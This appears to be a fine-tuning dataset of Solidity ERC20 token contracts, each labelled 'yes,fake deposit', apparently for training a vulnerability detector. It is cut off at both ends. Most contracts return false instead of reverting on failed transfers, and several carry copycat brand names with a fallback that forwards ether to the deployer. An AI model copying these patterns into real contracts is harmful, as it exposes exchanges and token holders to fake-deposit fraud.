balanceOf(address _address) public view returns (uint) {\n return balances[_address];\n }\n\n function depositNumberOf(address _address) public view returns (uint) {\n return counts[_address];\n }\n\n // ========== EXTERNAL SETTERS ==========\n\n function setTokenAddress(address _erc20Address) public onlyOwner {\n erc20Address = _erc20Address;\n }\n\n \n function setAuthority(address _authority) public onlyOwner {\n authority = _authority;\n }\n\n function batchDeposit(address[] destinations, uint[] amounts) public returns (bool) {\n require(msg.sender == authority, \"Caller is not authorized\");\n require(erc20Address != address(0), \"erc20 token address is not set\");\n require(destinations.length == amounts.length, \"length of inputs not match\");\n\n // we don't need check amount[i] > 0 or destinations != 0x0 because they cannot claim anyway\n uint amount = 0;\n for (uint i = 0; i < amounts.length; i++) {\n amount = amount.add(amounts[i]);\n balances[destinations[i]] = balances[destinations[i]].add(amounts[i]);\n counts[destinations[i]] += 1;\n }\n\n totalSupply = totalSupply.add(amount);\n\n emit TokenDeposit(amount);\n return true;\n }\n\n function claim() public whenNotPaused returns (bool) {\n require(erc20Address != address(0), \"erc20 token address is not set\");\n require(balances[msg.sender] > 0, \"account balance is zero\");\n\n uint _amount = balances[msg.sender];\n require(\n IERC20(erc20Address).balanceOf(address(this)) >= _amount,\n \"This contract does not have enough tokens to distribute\"\n );\n\n balances[msg.sender] = 0;\n IERC20(erc20Address).transfer(msg.sender, _amount);\n totalSupply = totalSupply.sub(_amount);\n\n emit UserClaimed(msg.sender, _amount);\n return true;\n }\n\n function transfer(address _address, uint _amount) public returns (bool) {\n require(msg.sender == authority, \"Caller is not authorized\");\n require(erc20Address != address(0), \"erc20 token address is not set\");\n require(\n IERC20(erc20Address).balanceOf(address(this)) >= _amount,\n \"This contract does not have enough tokens to distribute\"\n );\n IERC20(erc20Address).transfer(_address, _amount);\n return true;\n\n }\n\n \n event TokenDeposit(uint _amount);\n event UserClaimed(address _address, uint _amount);\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Smoothy is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000*10**uint256(decimals);\n string public constant name = \"Smoothy.finance\";\n string public constant symbol = \"SMTY\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract MetaMaskToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"MetaMask Token\";\n string public constant symbol = \"MSKT\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract ProMind is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply * 10 ** uint256(decimals);\n _balances[msg.sender] = initialSupply * 10 ** uint256(decimals);\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ElonTweets is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Elon Tweets\";\n string public constant symbol = \"ELONT \ud83d\udc26\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n/// @return total amount of tokens\nfunction totalSupply() constant returns (uint256 supply) {}\n\n/// @param _owner The address from which the balance will be retrieved\n/// @return The balance\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\n\n/// @notice send `_value` token to `_to` from `msg.sender`\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\n\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n/// @param _from The address of the sender\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @param _value The amount of wei to be approved for transfer\n/// @return Whether the approval was successful or not\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\n\n/// @param _owner The address of the account owning tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @return Amount of remaining tokens allowed to spent\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\n\n\ncontract StandardToken is Token {\n\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n//Default assumes totalSupply can't be over max (2^256 - 1).\n//If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n//Replace the if with this one instead.\n//if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\nif (balances[msg.sender] >= _value && _value > 0) {\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nTransfer(msg.sender, _to, _value);\nreturn true;\n} else { return false; }\n}\n\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n//same as above. Replace this line with the following if you want to protect against wrapping uints.\n//if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\nif (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\nbalances[_to] += _value;\nbalances[_from] -= _value;\nallowed[_from][msg.sender] -= _value;\nTransfer(_from, _to, _value);\nreturn true;\n} else { return false; }\n}\n\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\nreturn balances[_owner];\n}\n\nfunction approve(address _spender, uint256 _value) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nreturn true;\n}\n\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\nreturn allowed[_owner][_spender];\n}\n\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\nuint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\nfunction () {\n//if ether is sent to this address, send it back.\nthrow;\n}\n\n\n\n\nstring public name; //fancy name: eg Simon Bucks\nuint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\nstring public symbol; //An identifier: eg SBX\nstring public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\nfunction ERC20Token(\n) {\nbalances[msg.sender] = 1000; // Give the creator all initial tokens (100000 for example)\ntotalSupply = 1000; // Update total supply (100000 for example)\nname = \"Cryptogate\"; // Set the name for display purposes\ndecimals = 0; // Amount of decimals for display purposes\nsymbol = \"CG\"; // Set the symbol for display purposes\n}\n\n\nfunction approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\n\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n//receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n//it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\ncontract Arzdigital {\n/// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n/// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n/// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n/// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\ncontract StandardToken is Arzdigital {\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\nmapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n//name this contract whatever you\u2019d like\ncontract Token is StandardToken {\nfunction () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n\n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It\u2019s like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n//\n// \u0628\u0631\u0627\u06cc \u062a\u0648\u06a9\u0646 \u062e\u0648\u062f \u0645\u0642\u062f\u0627\u0631\u0647\u0627\u06cc \u0632\u06cc\u0631 \u0631\u0627 \u062a\u063a\u06cc\u06cc\u0631 \u062f\u0647\u06cc\u062f\n//\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\nfunction Token(\n ) {\n balances[msg.sender] = 1000000000000; // \u062a\u0645\u0627\u0645 \u062a\u0648\u06a9\u0646\u0647\u0627\u06cc \u0633\u0627\u062e\u062a\u0647 \u0634\u062f\u0647 \u0633\u0627\u0632\u0646\u062f\u0647 \u0628\u0631\u0633\u062f -\u0639\u062f\u062f\u06cc \u0648\u0627\u0631\u062f \u06a9\u0646\u06cc\u062f \u0645\u062b\u0644\u0627 100000\n totalSupply = 1000000000000; // \u062a\u0645\u0627\u0645 \u0639\u0631\u0636\u0647\n name = 'HAZEM & AMIR'; // \u0646\u0627\u0645 \u062a\u0648\u06a9\u0646\n decimals = 5; // \u0627\u0639\u0634\u0627\u0631\n symbol = 'HMR'; // \u0646\u0645\u0627\u062f \u062a\u0648\u06a9\u0646\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3('receiveApproval(address,uint256,address,bytes)'))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant public returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) view public returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) public returns (bool success) { return true; }\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { return true;}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) public returns (bool success) { return true; }\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract Papillon is StandardToken {\n\n function () public {\n //if ether is sent to this address, send it back.\n revert();\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n constructor() public {\n balances[msg.sender] = 1000000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"Papillon\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"PAPI\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'ShibaInuBadger' token contract\n//\n// Symbol : SHIB \ud83e\udda1\n// Name : Shiba Inu Badger\n// Total supply: 100000000000000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ShibaInuBadger is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Shiba Inu Badger\";\n string public constant symbol = \"SHIB \ud83e\udda1\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Can Swap\";\n decimals = 0;\n symbol = \"CAN\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the 